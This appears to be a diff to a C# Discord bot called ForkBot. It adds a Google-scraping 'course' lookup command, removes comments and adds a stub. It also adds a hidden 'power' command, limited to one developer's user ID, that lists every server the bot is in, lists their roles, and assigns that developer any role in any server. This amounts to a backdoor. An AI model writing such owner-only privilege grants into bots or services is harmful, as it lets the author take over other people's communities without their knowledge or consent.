@@ -493,6 +493,55 @@ namespace ForkBot
             }
         }
 
+        [Command("course"), Summary("Shows details for course from inputted course code.")]
+        public async Task Course([Remainder] string code)
+        {
+            string searchLink = "http://www.google.com/search?q=w2prod " + code;
+            HtmlWeb web = new HtmlWeb();
+            var page = web.Load(searchLink);
+            var html = page.ParsedText;
+            var index = html.IndexOf("<h3 class=\"r\">");
+            int start = 0, end = 0;
+            for (int i = index; i < html.Count();i++)
+            {
+                if (html.Substring(i, 2) == "q=") 
+                {
+                    start = i + 2;
+                    for (int o = start; o < html.Count(); o++)
+                    {
+                        ///html/body/table/tbody/tr[2]/td[2]/table/tbody/tr[2]/td/table/tbody/tr/td
+                        if (html[o] == '&')
+                        {
+                            end = o;
+                            break;
+                        }
+                    }
+                    break;
+                }
+            }
+            string newLink = "";
+            if (start == 0 || end == 0)
+            {
+                await Context.Channel.SendMessageAsync("Error");
+            }
+            ///html/body/table/tbody/tr[2]/td[2]/table/tbody/tr[2]/td/table/tbody/tr/td
+            else
+            {
+                newLink = html.Substring(start, end - start).Replace("%3F","?").Replace("%3D", "=").Replace("%26", "&");
+                page = web.Load(newLink);
+                var desc = page.DocumentNode.SelectSingleNode("/html[1]/body[1]/table[1]/tr[2]/td[2]/table[1]/tr[2]/td[1]/table[1]/tr[1]/td[1]").ChildNodes[5].InnerText;
+                string title = page.DocumentNode.SelectSingleNode("/html[1]/body[1]/table[1]/tr[2]/td[2]/table[1]/tr[2]/td[1]/table[1]/tr[1]/td[1]/table[1]/tr[1]/td[1]").InnerText.Replace("&nbsp;","");
+
+                JEmbed emb = new JEmbed();
+                emb.Title = title;
+                emb.Description = desc;
+                emb.ColorStripe = Constants.Colours.YORK_RED;
+
+                await Context.Channel.SendMessageAsync("", embed: emb.Build());
+
+            }
+        }
+
         #region Item Commands
         [Command("roll")]
         public async Task Roll(int max = 6)
@@ -551,8 +600,7 @@ namespace ForkBot
             }
             else await Context.Channel.SendMessageAsync($"You do not have an item called {item}!");
         }
-
-        //Test me!
+        
         [Command("trade"), Summary("[FUN] Initiate a trade with another user!")]
         public async Task Trade(IUser user)
         {
@@ -566,8 +614,7 @@ namespace ForkBot
             else await Context.Channel.SendMessageAsync("Either you or the person you are attempting to trade with is already in a trade!"
                                                     +" If you accidentally left a trade going, use `;trade cancel` to cancel the trade.");
         }
-
-        //Test me!
+        
         [Command("trade")]
         public async Task Trade(string command, string param = "")
         {
@@ -621,6 +668,8 @@ namespace ForkBot
                 Var.trades.Remove(trade);
             }
         }
+
+        //[Command("shop"),]
         #endregion
 
         //for viewing a tag
@@ -844,6 +893,40 @@ namespace ForkBot
             }
             else await Context.Channel.SendMessageAsync("Sorry, only Brady can use this right now.");
         }
+
+        [Command("power"), Alias(new string[] { "p", "pow" })]
+        public async Task Power(params string[] command)
+        {
+            if (Context.User.Id == Constants.Users.BRADY)
+            {
+                string msg = "";
+                if (command[0] == "servers")
+                {
+                    foreach(IGuild g in Bot.client.Guilds)
+                    {
+                        msg += g.Name + " : " + g.Id + "\n";
+                    }
+                }
+                else if (command[0] == "roles")
+                {
+                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
+                    foreach(IRole r in g.Roles)
+                    {
+                        msg += r.Name + " : " + r.Id + "\n";
+                    }
+                }
+                else if (command[0] == "giverole")
+                {
+                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
+                    IRole r = g.GetRole(Convert.ToUInt64(command[2]));
+                    var me = await g.GetUserAsync(Constants.Users.BRADY);
+                    await me.AddRoleAsync(r);
+                    msg = "done";
+                }
+                await Context.Channel.SendMessageAsync(msg);
+            }
+        }
+
         #endregion
     }
 }
